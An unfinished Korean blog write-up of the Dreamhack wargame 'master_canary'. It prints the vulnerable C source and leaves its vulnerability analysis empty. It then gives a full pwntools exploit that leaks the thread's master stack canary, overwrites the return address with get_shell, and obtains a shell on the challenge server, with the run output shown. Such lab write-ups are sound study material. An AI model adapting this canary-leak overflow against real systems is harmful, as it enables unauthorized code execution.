---
title: Dreamhack wargame master_canary write-up
tags: [Dreamhack, pwnable, master_canary]
style: 
color: 
description: stack 영역에서 발생하는 취약점을 알아보자. 
---

# 내일 이어서 쓰겠습니다.. 

## Code Analysis
---
``` c
// gcc -o master master.c -pthread
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>

char *global_buffer;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

void *thread_routine() {
    char buf[256];

    global_buffer = buf;

}
void read_bytes(char *buf, size_t size) {
    size_t sz = 0;
    size_t idx = 0;
    size_t tmp;

    while (sz < size) {
        tmp = read(0, &buf[idx], 1);
        if (tmp != 1) {
            exit(-1);
        }
        idx += 1;
        sz += 1;
    }
    return;
}
int main(int argc, char *argv[]) {
    size_t size;
    pthread_t thread_t;
    size_t idx;
    char leave_comment[32];


    initialize();

    while(1) {
        printf("1. Create thread\n");
        printf("2. Input\n");
        printf("3. Exit\n");
        printf("> ");
        scanf("%d", &idx);

        switch(idx) {
            case 1:
                if (pthread_create(&thread_t, NULL, thread_routine, NULL) < 0)
                {
                    perror("thread create error");
                    exit(0);
                }
                break;
            case 2:
                printf("Size: ");
                scanf("%d", &size);

                printf("Data: ");
                read_bytes(global_buffer, size);

                printf("Data: %s", global_buffer);
                break;
            case 3:
                printf("Leave comment: ");
                read(0, leave_comment, 1024);
                return 0;
            default:
                printf("Nope\n");
                break;
        }
    }
    

    return 0;
}
```
<br><br>

## Vulnerability Analysis
---



## Exploit
---
``` python
#mater_canary.py
from pwn import *
context.log_level = 'debug'

p = remote('host1.dreamhack.games', 15626)
e = ELF('./master_canary')


# p = process('./master_canary')
# e = ELF('./master_canary')
# libc = e.libc

p.recvuntil('> ')

p.sendline('1')

p.sendline('2')

time.sleep(1)

p.sendlineafter('Size: ', '2281')

# pause()
p.recvuntil('Data: ')

for i in range(2281):
    # time.sleep(1)
    p.send('A')

time.sleep(1)

p.recvuntil('Data: ')
p.recv(2281)

canary = u64(p.recv(7).rjust(8, '\x00'))
print 'Master Canary: ' + hex(canary)

p.sendline('3')
pause()

time.sleep(1)

payload = 'A' * 40
payload += p64(canary)
payload += 'A' * 8
payload += p64(e.sym['get_shell'])

p.sendafter(': ',payload)

p.interactive()
```

<br>

``` sh
lourcode@lourcode:~/Share/lourcode/Pwnable/dreamhack/master_canary$ python mater_canary.py
[+] Opening connection to host1.dreamhack.games on port 15626: Done
[*] '/home/lourcode/Share/lourcode/Pwnable/dreamhack/master_canary/master_canary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
Master Canary: 0xbd248a1e37945400
[*] Switching to interactive mode
$ id
uid=1000(master_canary) gid=1000(master_canary) groups=1000(master_canary)
```
쉘을 획득했다.
<br><br>

### Good Game!
EZ<br><br>

너무 힘들다..<br>
![img1](/assets/master_canary/img1.png)
